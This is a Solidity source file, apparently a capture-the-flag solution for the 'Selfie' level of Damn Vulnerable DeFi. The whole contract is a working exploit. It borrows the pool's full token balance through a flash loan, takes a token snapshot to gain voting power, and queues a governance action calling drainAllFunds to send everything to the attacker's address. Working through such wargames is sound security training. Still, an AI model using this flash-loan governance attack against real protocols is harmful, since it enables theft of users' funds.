pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;
    function transfer(address, uint256) external;
    function balanceOf(address account) external returns (uint256);
}


contract SelfieAttacker { 

    IDamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    ISelfiePool pool;
    address private _owner;

    uint256 public actionId;
    
    constructor(
        IDamnValuableTokenSnapshot _token,
        ISimpleGovernance _governance,
        ISelfiePool _pool
    ) {
        token = _token;
        governance = _governance;
        pool = _pool;
        _owner = msg.sender;
    }

    function attack() public {
        require(msg.sender == _owner);
        uint256 flashLoanBalance = token.balanceOf(address(pool));

        pool.flashLoan(flashLoanBalance);
    }


    function receiveTokens(
        address, /* tokenAddress */
        uint256 amount
    ) external {
        token.snapshot();

        bytes memory drainAllFundsPayload =
            abi.encodeWithSignature("drainAllFunds(address)", _owner);

        actionId = governance.queueAction(
            address(pool),
            drainAllFundsPayload,
            0
        );

        // pay back to flash loan sender
        token.transfer(address(pool), amount);
    }

    receive () external payable {}


}